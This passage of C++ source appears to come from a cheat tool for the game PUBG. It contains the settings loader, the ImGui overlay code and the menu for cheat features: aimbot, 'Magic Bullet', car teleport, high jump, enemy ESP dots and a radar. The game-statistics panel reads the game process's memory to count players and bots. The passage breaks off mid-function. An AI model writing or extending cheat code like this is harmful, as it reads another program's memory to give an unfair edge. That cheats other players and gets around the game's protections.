	Setting::carteleport = ini.GetLongValue("carteleport", "Enabled", Setting::carteleport);
	Setting::carteleportkey = ini.GetBoolValue("carteleportkey", "Value", Setting::carteleportkey); //For Writing Bool


	Setting::highjump = ini.GetLongValue("high jump", "Enabled", Setting::highjump);
	Setting::highjumpv1 = ini.GetLongValue("high jumpv1", "Enabled", Setting::highjumpv1);
	Setting::highjump2 = ini.GetLongValue("high jumpv2", "Enabled", Setting::highjump2);
	Setting::highjumpv = ini.GetBoolValue("highjumpv1 Value", "Value", Setting::highjumpv); //For Writing Bool
	Setting::highjumpv2 = ini.GetBoolValue("highjumpv2 Value", "Value", Setting::highjumpv2); //For Writing Bool


	nsize = ini.GetLongValue("nsize", "Value", nsize); //For Writing Values

	dotsstyle = ini.GetLongValue("Enemy Dots Style", "Value", dotsstyle);
	VehicleStyle = ini.GetLongValue("VehicleStyle", "Player", VehicleStyle);
	Setting::DotsRange = ini.GetLongValue("Enemy DotsRange", "Player", Setting::DotsRange);
	Setting::DotsRadius = ini.GetLongValue("Enemy DotsRadius", "Player", Setting::DotsRadius);
	Setting::DotsThickness = ini.GetLongValue("Enemy DotsThickness", "Player", Setting::DotsThickness);
}

int botcount;
int playercount;
void DrawTotalEnemies() {

	int botcount;
	int playercount;

	ImGuiIO& Io = ImGui::GetIO();
	//ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(10, 10));

	if (Data::AActorList.size() > 0)
	{
		botcount = 0;
		playercount = 0;

		for (AActor& AActor : Data::AActorList)
		{
			if (AActor.Name == " Bot ")
			{
				botcount = botcount + 1;
			}
			else
			{
				playercount = playercount + 1;
			}
		}

		int originalWidth = 256;
		int originalHeight = 50;

		/*float screenWidth = ImGui::GetIO().DisplaySize.x;
		float screenHeight = ImGui::GetIO().DisplaySize.y;

		float imageX = (screenWidth - originalWidth) / 2.0f;*/

		// Set the offset to move the image down by 50 units (adjust this value as needed)
		float yOffset = 60.0f;

		ImGui::SetNextWindowPos(ImVec2({ (DX11Window::Width / 2.0f) }, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
		ImGui::Begin("Image Window", nullptr, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBackground);

		// Display the image with its original width and height
		ImGui::Image((PVOID)DX11::TotalEnemy, ImVec2(originalWidth, originalHeight));
		//ImGui::Image((PVOID)DX11::bacground1, ImVec2(766, 517));
		// Set the cursor position for the text
		float textXOffset = 90.0f;
		float textYOffset = 18.0f;
		ImGui::SetCursorPosX(textXOffset);
		ImGui::SetCursorPosY(textYOffset);

		// Calculate the font scale (adjust the scale factor as needed)
		float fontScale = 1.2f;
		float scaledFontSize = ImGui::GetFontSize() * fontScale;
		ImGui::SetWindowFontScale(fontScale); // Set the font scale for the entire window

		// Render the text with scaled font
		std::string playerText = std::to_string((playercount));
		std::string botText = "             " + std::to_string(botcount);

		ImGui::PushFont(DX11::ImGui_DX11::pRegularFont);
		// Use ImGui::Text and ImGui::SameLine to format the text
		ImGui::Text(playerText.c_str());
		ImGui::SameLine();
		ImGui::Text(botText.c_str());

		ImGui::PopFont(); // Restore the default font

		ImGui::End();
	}
	else
	{
		botcount = 0;
		playercount = 0;

		for (AActor& AActor : Data::AActorList)
		{
			if (AActor.Name == " Bot ")
			{
				botcount = botcount + 1;
			}
			else
			{
				playercount = playercount + 1;
			}
		}

		int originalWidth = 256;
		int originalHeight = 50;

		/*float screenWidth = ImGui::GetIO().DisplaySize.x;
		float screenHeight = ImGui::GetIO().DisplaySize.y;

		float imageX = (screenWidth - originalWidth) / 2.0f;*/

		// Set the offset to move the image down by 50 units (adjust this value as needed)
		float yOffset = 60.0f;

		ImGui::SetNextWindowPos(ImVec2({ (DX11Window::Width / 2.0f) }, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
		ImGui::Begin("Image Window", nullptr, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoBackground);

		// Display the image with its original width and height
		ImGui::Image((PVOID)DX11::TotalEnemy, ImVec2(originalWidth, originalHeight));

		// Set the cursor position for the text
		float textXOffset = 90.0f;
		float textYOffset = 18.0f;
		ImGui::SetCursorPosX(textXOffset);
		ImGui::SetCursorPosY(textYOffset);

		// Calculate the font scale (adjust the scale factor as needed)
		float fontScale = 1.2f;
		float scaledFontSize = ImGui::GetFontSize() * fontScale;
		ImGui::SetWindowFontScale(fontScale); // Set the font scale for the entire window

		// Render the text with scaled font
		std::string playerText = std::to_string((playercount));
		std::string botText = "             " + std::to_string(botcount);

		ImGui::PushFont(DX11::ImGui_DX11::pRegularFont);
		// Use ImGui::Text and ImGui::SameLine to format the text
		ImGui::Text(playerText.c_str());
		ImGui::SameLine();
		ImGui::Text(botText.c_str());

		ImGui::PopFont(); // Restore the default font

		ImGui::End();


	}
}

void RotateTriangle(std::array<VECTOR3, 3>& points, float rotation)
{
	const auto points_center = (points.at(0) + points.at(1) + points.at(2)) / 3;
	for (auto& point : points)
	{
		point = point - points_center;

		const auto temp_x = point.X;
		const auto temp_y = point.Y;

		const auto theta = DEG2RAD(rotation);
		const auto c = cosf(theta);
		const auto s = sinf(theta);

		point.X = temp_x * c - temp_y * s;
		point.Y = temp_x * s + temp_y * c;

		point = point + points_center;
	}
}

bool showkey = false;




void ImGuiTextRGB(const char* fmt)
{


	static float isRed = 0.0f, isGreen = 0.01f, isBlue = 0.0f;


	auto isFrames = ImGui::GetFrameCount();

	if (isFrames % 1 == 0) {

		if (isGreen == 0.01f && isBlue == 0.0f) {
			isRed += 0.01f;
		}

		if (isRed > 0.99f && isBlue == 0.0f) {
			isRed = 1.0f;
			isGreen += 0.01f;
		}

		if (isGreen > 0.99f && isBlue == 0.0f) {
			isGreen = 1.0f;
			isRed -= 0.01f;
		}

		if (isRed < 0.01f && isGreen == 1.0f) {
			isRed = 0.0f;
			isBlue += 0.01f;
		}

		if (isBlue > 0.99f && isRed == 0.0f) {
			isBlue = 1.0f;
			isGreen -= 0.01f;
		}
		if (isGreen < 0.01f && isBlue == 1.0f) {
			isGreen = 0.0f;
			isRed += 0.01f;
		}
		if (isRed > 0.99f && isGreen == 0.0f) {
			isRed = 1.0f;
			isBlue -= 0.01f;
		}
		if (isBlue < 0.01f && isGreen == 0.0f) {
			isBlue = 0.0f;
			isRed -= 0.01f;
			if (isRed < 0.01f)
				isGreen = 0.01f;
		}
		ImGui::PushFont(DX11::ImGui_DX11::Font1);
		ImGui::PushStyleColor(ImGuiCol_Text, ImColor(isRed, isBlue, isGreen, 8.0f).Value);
		ImGui::Text(fmt);

		ImGui::PopFont();
		ImGui::PopStyleColor();

	}


}

string ShowMenuTwo = "";
string Active = "";
void DrawMenu2()
{


	if (Setting::KeyVersion == 0)
	{
		ShowMenuTwo = "PUBG VIP";
		DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 80, DX11::ImGui_DX11::Color::White, true);
		if (Setting::curraim == 0)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Head";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		else if (Setting::curraim == 1)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Body";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		else if (Setting::curraim == 2)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Foot";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		else if (Setting::curraim == 3)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Auto";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		if (Setting::Aimbot)
		{
			ShowMenuTwo = "F5 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::White, true);
			Active = "Aimbot (" + to_string(Setting::magicrange) + "M)";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 35, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::Green, true);
		}
		else
		{
			ShowMenuTwo = "F5 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::White, true);
			ShowMenuTwo = "Aimbot";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 35, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::Red, true);
		}
		if (Setting::fightmode)
		{
			ShowMenuTwo = "F4 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::White, true);
			Active = "Fight Mode ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 35, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::Green, true);
		}
		else
		{
			ShowMenuTwo = "F6 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::White, true);
			Active = "Fight Mode ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 35, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::Red, true);
		}
	}
	else if (Setting::KeyVersion == 1)
	{
		ShowMenuTwo = "PUBG VIP";
		DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 80, DX11::ImGui_DX11::Color::White, true);

		if (Setting::curraim == 0)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Head";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		else if (Setting::curraim == 1)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Body";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		else if (Setting::curraim == 2)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Foot";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		else if (Setting::curraim == 3)
		{
			ShowMenuTwo = "Aim : ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::White, true);
			Active = "Auto";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 55, DX11Window::Height / 2 - 60, DX11::ImGui_DX11::Color::Green, true);
		}
		if (Setting::MagicBulletticked)
		{
			ShowMenuTwo = "F5 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::White, true);
			Active = "Magic Bullet (" + to_string(Setting::magicrange) + "M)";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 35, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::Green, true);
		}
		else
		{
			ShowMenuTwo = "F5 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::White, true);
			ShowMenuTwo = "Magic Bullet";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 35, DX11Window::Height / 2 - 40, DX11::ImGui_DX11::Color::Red, true);
		}
		if (Setting::fightmode)
		{
			ShowMenuTwo = "F4 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::White, true);
			Active = "Fight Mode ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 35, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::Green, true);
		}
		else
		{
			ShowMenuTwo = "F4 ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, ShowMenuTwo, 10, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::White, true);
			Active = "Fight Mode ";
			DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 18, Active, 35, DX11Window::Height / 2 - 20, DX11::ImGui_DX11::Color::Red, true);
		}
	}

}



#include <chrono>
static int64_t eptime = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();

void Drawgameinfo()
{
	ImGuiIO& Io = ImGui::GetIO();

	ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 220));
	ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.2f, Io.DisplaySize.y * 0.0f), ImGuiCond_FirstUseEver, ImVec2(0.2f, 0.0f));
	if (ImGui::Begin("GAME STATISTICS ", 0, Flags221))
	{
		if (Setting::Lang == 0)
		{
			ImGui::PushFont(DX11::ImGui_DX11::Font1);
			if (Data::NetDriver > 0)
			{
				bool IsDeadDDDD = Utility::ReadMemoryEx<bool>(Data::LocalPlayer + Offset::IsDead);
				if (Data::AliveTeamNum == 1)
				{
					//ImDrawList* pDrawList;
					//const auto& p = ImGui::GetWindowPos();
					//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
					//pDrawList = pWindowDrawList;
					//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
					//
					//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 10, ImColor(255, 0, 0, 255), 30);
					//}
					ImGui::Text("Game information.");
					ImGui::Separator();
					ImGui::Text("Winner Winner Chicken Dinner");

				}
				else
				{
					//ImDrawList* pDrawList;
					//const auto& p = ImGui::GetWindowPos();
					//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
					//pDrawList = pWindowDrawList;
					//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
					//
					//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 7, ImColor(255, 0, 0, 255), 30);
					//}
					ImGui::Text("Game information.");
					ImGui::Separator();
					string Textt4 = "Travelled distance: ";
					string Textt5 = "m (";
					string Textt6 = "m/s)";
					string Textt3 = " team, real players: ";
					string Textt2 = " players alive with ";
					stringstream format2stream2;
					stringstream forma2stream;
					format2stream2 << std::fixed << std::setprecision(2) << Data::GameInfovelocity;
					string format2str2 = format2stream2.str();
					forma2stream << std::fixed << std::setprecision(0) << Data::DistanceTravelled;
					string format2str2g = forma2stream.str();
					string Textt = to_string(Data::AlivePlayerNum).c_str() + Textt2 + to_string(Data::AliveTeamNum).c_str() + Textt3 + to_string(Data::RealPls).c_str();
					string Textttt = Textt4 + forma2stream.str() + Textt5 + format2stream2.str() + Textt6;
					ImGui::Text((Textt).c_str());
					ImGui::Text((Textttt).c_str());
					ImGui::Separator();
					string Text;
					if (Data::AlivePlayerNum <= 4 && Data::AliveTeamNum == 1)
					{
						Text = "Connected to lobby, please exit.";
					}
					else
					{
						Text = "In match (" + to_string(Data::TimeRemind) + " seconds)";
					}
					ImGui::Text((Text).c_str());
				}
			}
			else
			{
				//ImDrawList* pDrawList;
				//const auto& p = ImGui::GetWindowPos();
				//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
				//pDrawList = pWindowDrawList;
				//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
				//
				//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 7, ImColor(255, 0, 0, 255), 30);
				//}
				ImGui::Text("Game information.");
				ImGui::Separator();
				ImGui::Text("You Are In Lobby.");
				Data::DistanceTravelled = 0;

			}
			ImGui::PopFont();
		}
		if (Setting::Lang == 1)
		{
			//ImGui::PushFont(DX11::ImGui_DX11::Font1);
			if (Data::NetDriver > 0)
			{
				bool IsDeadDDDD = Utility::ReadMemoryEx<bool>(Data::LocalPlayer + Offset::IsDead);
				if (Data::NetDriver > 0 && !IsDeadDDDD && Data::AliveTeamNum == 1)
				{
					//ImDrawList* pDrawList;
					//const auto& p = ImGui::GetWindowPos();
					//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
					//pDrawList = pWindowDrawList;
					//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
					//
					//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 10, ImColor(255, 0, 0, 255), 30);
					//}
					ImGui::Text(u8"ﻢﻴﺠﻟﺍ ﺕﺎﻣﻮﻠﻌﻣ.");
					ImGui::Separator();
					ImGui::Text(u8"ﺰﺋﺎﻔﻟﺍ ﺖﻧﺍ");
				}
				else
				{
					//ImDrawList* pDrawList;
					//const auto& p = ImGui::GetWindowPos();
					//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
					//pDrawList = pWindowDrawList;
					//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
					//
					//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 7, ImColor(255, 0, 0, 255), 30);
					//}
					ImGui::Text(u8"ﻢﻴﺠﻟﺍ ﺕﺎﻣﻮﻠﻌﻣ.");
					ImGui::Separator();
					string Textt4 = u8"ﺔﻋﻮﻄﻘﻤﻟﺍ ﺔﻓﺎﺴﻤﻟﺍ: ";
					string Textt5 = u8"ﻡ (";
					string Textt6 = u8"ﻡ/ﺙ)";
					string Textt3 = u8" ﻦﻴﻴﻘﻴﻘﺣ ﻦﻴﺒﻋﻻ ،ﻖﻳﺮﻓ: ";
					string Textt2 = u8" ﻊﻣ ﻥﻮﺸﻴﻌﻳ ﻦﻳﺬﻟﺍ ﻦﻴﺒﻋﻼﻟﺍ ";
					stringstream format2stream2;
					stringstream forma2stream;
					format2stream2 << std::fixed << std::setprecision(2) << Data::GameInfovelocity;
					string format2str2 = format2stream2.str();
					forma2stream << std::fixed << std::setprecision(0) << Data::DistanceTravelled;
					string format2str2g = forma2stream.str();
					string Textt = to_string(Data::AlivePlayerNum).c_str() + Textt2 + to_string(Data::AliveTeamNum).c_str() + Textt3 + to_string(Data::RealPls).c_str();
					string Textttt = Textt4 + forma2stream.str() + Textt5 + format2stream2.str() + Textt6;
					ImGui::Text((Textt).c_str());
					ImGui::Text((Textttt).c_str());
					ImGui::Separator();
					string Text;
					if (Data::AlivePlayerNum <= 4 && Data::AliveTeamNum == 1)
					{
						Text = u8".ﺝﻭﺮﺨﻟﺍ ﻰﺟﺮﻳ ،ﻲﺑﻮﻠﻟﺎﺑ ﻞﺼﺘﻣ";
					}
					else
					{
						Text = u8"ﻢﻴﺠﻟﺍ ﻲﻓ (" + to_string(Data::TimeRemind) + u8" ﺔﻴﻧﺎﺛ)";
					}
					ImGui::Text((Text).c_str());
				}
			}
			else
			{
				//ImDrawList* pDrawList;
				//const auto& p = ImGui::GetWindowPos();
				//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
				//pDrawList = pWindowDrawList;
				//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
				//
				//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 7, ImColor(255, 0, 0, 255), 30);
				//}
				ImGui::Text(u8"ﻢﻴﺠﻟﺍ ﺕﺎﻣﻮﻠﻌﻣ.");
				ImGui::Separator();
				ImGui::Text(u8"ﻲﺑﻮﻠﻟﺍ ﻲﻓ ﻥﻻﺍ ﺖﻧﺍ");
				Data::DistanceTravelled = 0;

			}
			//ImGui::PopFont();
		}
		else if (Setting::Lang == 2)
		{
			//ImGui::PushFont(DX11::ImGui_DX11::Chinese);
			if (Data::NetDriver > 0)
			{

				bool IsDeadDDDD = Utility::ReadMemoryEx<bool>(Data::LocalPlayer + Offset::IsDead);
				if (Data::NetDriver > 0 && !IsDeadDDDD && Data::AliveTeamNum == 1)
				{
					//ImDrawList* pDrawList;
					//const auto& p = ImGui::GetWindowPos();
					//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
					//pDrawList = pWindowDrawList;
					//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
					//
					//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 7, ImColor(255, 0, 0, 255), 30);
					//}
					ImGui::Text(u8"OYUN BİLGİLERİ");
					ImGui::Separator();
					ImGui::Text(u8"KAZANAN KAZANAN TAVUK AKŞAM YEMEĞİ");
				}
				else
				{
					//ImDrawList* pDrawList;
					//const auto& p = ImGui::GetWindowPos();
					//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
					//pDrawList = pWindowDrawList;
					//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
					//
					//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 7, ImColor(255, 0, 0, 255), 30);
					//}
					ImGui::Text("OYUN BİLGİLERİ");
					ImGui::Separator();
					string Textt4 = "Kat edilen mesafe: ";
					string Textt5 = "m (";
					string Textt6 = "m/s)";
					string Textt3 = " takım, gerçek oyuncular: ";
					string Textt2 = " hayatta kalan oyuncular ";
					stringstream format2stream2;
					stringstream forma2stream;
					format2stream2 << std::fixed << std::setprecision(2) << Data::GameInfovelocity;
					string format2str2 = format2stream2.str();
					forma2stream << std::fixed << std::setprecision(0) << Data::DistanceTravelled;
					string format2str2g = forma2stream.str();
					string Textt = to_string(Data::AlivePlayerNum).c_str() + Textt2 + to_string(Data::AliveTeamNum).c_str() + Textt3 + to_string(Data::RealPls).c_str();
					string Textttt = Textt4 + forma2stream.str() + Textt5 + format2stream2.str() + Textt6;
					ImGui::Text((Textt).c_str());
					ImGui::Text((Textttt).c_str());
					ImGui::Separator();
					string Text;
					if (Data::AlivePlayerNum <= 4 && Data::AliveTeamNum == 1)
					{
						Text = "Lobiye bağlanıldı, lütfen çıkın.";
					}
					else
					{
						Text = "Maçta (" + to_string(Data::TimeRemind) + " saniye)";
					}
					ImGui::Text((Text).c_str());
				}
			}
			else
			{
				//ImDrawList* pDrawList;
				//const auto& p = ImGui::GetWindowPos();
				//const auto& pWindowDrawList = ImGui::GetWindowDrawList();
				//pDrawList = pWindowDrawList;
				//if (fmodf((float)ImGui::GetTime(), 2.0f) < 1.0f) {
				//
				//	pWindowDrawList->AddCircleFilled(ImVec2(18 + p.x, 18 + p.y), 7, ImColor(255, 0, 0, 255), 30);
				//}
				ImGui::Text(u8"OYUN BİLGİLERİ");
				ImGui::Separator();
				ImGui::Text(u8"ŞİMDİ LOBİDESİNİZ");

			}
			//ImGui::PopFont();
		}

		ImGui::End();
	}
	ImGui::PopStyleColor();
}

void CheckboxCallback(bool* value)
{
	*value = !(*value);
}
void DrawRadarHUD(MinimalViewInfo Camera, AActor Player, int Distance, int xAxis, int yAxis, int width, int height, ImVec4 color)
{

	ImGui::SetNextWindowSize(ImVec2(Setting::RadarLength, Setting::RadarWidth));
	ImGuiIO& Io = ImGui::GetIO();

	ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(15, 14, 14, 180));
	ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(255, 255, 255, 180));
	ImGui::SetNextWindowPos(ImVec2(50, (Io.DisplaySize.y / 2) + 100), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
	ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 100); // Round borders
	if (ImGui::Begin("     ", 0, Flags21))
	{
		{
			ImVec2 wind = ImGui::GetWindowSize();
			ImVec2 wind2 = ImGui::GetWindowPos();
			bool out = false;
			VECTOR3 siz;
			siz.X = wind.x;
			siz.Y = wind.y;
			VECTOR3 pos;
			pos.X = wind2.x;
			pos.Y = wind2.y;
			float RadarCenterX = pos.X + (siz.X / 2);
			float RadarCenterY = pos.Y + (siz.Y / 2);

			DX11::ImGui_DX11::IMGUIDRAWCIRCLE(RadarCenterX, RadarCenterY, 100, ImVec4(114, 114, 114, 100), 1.0f);
			DX11::ImGui_DX11::IMGUIDRAWCIRCLE(RadarCenterX, RadarCenterY, 60, ImVec4(114, 114, 114, 100), 1.0f);
			DX11::ImGui_DX11::IMGUIDRAWCIRCLE(RadarCenterX, RadarCenterY, 35, ImVec4(114, 114, 114, 100), 1.0f);
			DX11::ImGui_DX11::IMGUIDRAWLINE(pos.X, RadarCenterY, pos.X + siz.X, RadarCenterY, ImVec4(114, 114, 114, 100), 1.0f);
			DX11::ImGui_DX11::IMGUIDRAWLINE(RadarCenterX, RadarCenterY, RadarCenterX, pos.Y + siz.Y, ImVec4(114, 114, 114, 100), 1.0f);
			DX11::ImGui_DX11::IMGUIDRAWLINE(RadarCenterX, RadarCenterY, RadarCenterX, pos.X, ImVec4(255, 255, 255, 100), 1.0f);
			VECTOR3 ddddd;
			ddddd.X = siz.X;
			ddddd.Y = siz.Y;
			ddddd.Z = 0;
			VECTOR3 single = WorldToRadar(Camera.Rotation.Yaw, Player.Position, Data::CameraCache.POV.Location, pos.X, pos.Y, ddddd, out);

			if (Distance < Setting::PlayerMAxDistance)
			{
				DX11::ImGui_DX11::IMGUIDRAWFILLEDCIRCLE(single.X, single.Y, 3, ImVec4(color), 4.0f);
			}



		}
		ImGui::End();
	}
	ImGui::PopStyleColor();
	ImGui::PopStyleColor();
	ImGui::PopStyleVar();
}

int getActiveUserCount()
{
	static std::mutex mutex;
	std::lock_guard<std::mutex> lock(mutex);

	// Read the user count from a file
	std::ifstream file("user_count.txt");
	int count = 0;
	if (file.good())
	{
		file >> count;
	}
	file.close();

	return count;
}
// Function to increment the number of active game users
void incrementActiveUserCount()
{
	static std::mutex mutex;
	std::lock_guard<std::mutex> lock(mutex);

	// Read the user count from a file
	std::ifstream file("user_count.txt");
	int count = 0;
	if (file.good())
	{
		file >> count;
	}
	file.close();

	// Increment the count and write it back to the file
	count++;
	std::ofstream outfile("user_count.txt");
	outfile << count;
	outfile.close();
}
// Function to decrement the number of active game users
void decrementActiveUserCount()
{
	static std::mutex mutex;
	std::lock_guard<std::mutex> lock(mutex);

	// Read the user count from a file
	std::ifstream file("user_count.txt");
	int count = 0;
	if (file.good())
	{
		file >> count;
	}
	file.close();

	// Decrement the count and write it back to the file
	if (count > 0)
	{
		count--;
	}
	std::ofstream outfile("user_count.txt");
	outfile << count;
	outfile.close();
}

std::string formatElapsedTime(long long elapsed_seconds)
{
	if (elapsed_seconds < 60)
	{
		return std::to_string(elapsed_seconds) + " seconds";
	}
	else if (elapsed_seconds < 3600)
	{
		int minutes = elapsed_seconds / 60;
		int seconds = elapsed_seconds % 60;
		return std::to_string(minutes) + " minutes, " + std::to_string(seconds) + " seconds";
	}
	else if (elapsed_seconds < 86400)
	{
		int hours = elapsed_seconds / 3600;
		int minutes = (elapsed_seconds % 3600) / 60;
		return std::to_string(hours) + " hours, " + std::to_string(minutes) + " minutes";
	}
	else if (elapsed_seconds < 604800)
	{
		int days = elapsed_seconds / 86400;
		int hours = (elapsed_seconds % 86400) / 3600;
		return std::to_string(days) + " days, " + std::to_string(hours) + " hours";
	}
	else if (elapsed_seconds < 2592000)
	{
		int weeks = elapsed_seconds / 604800;
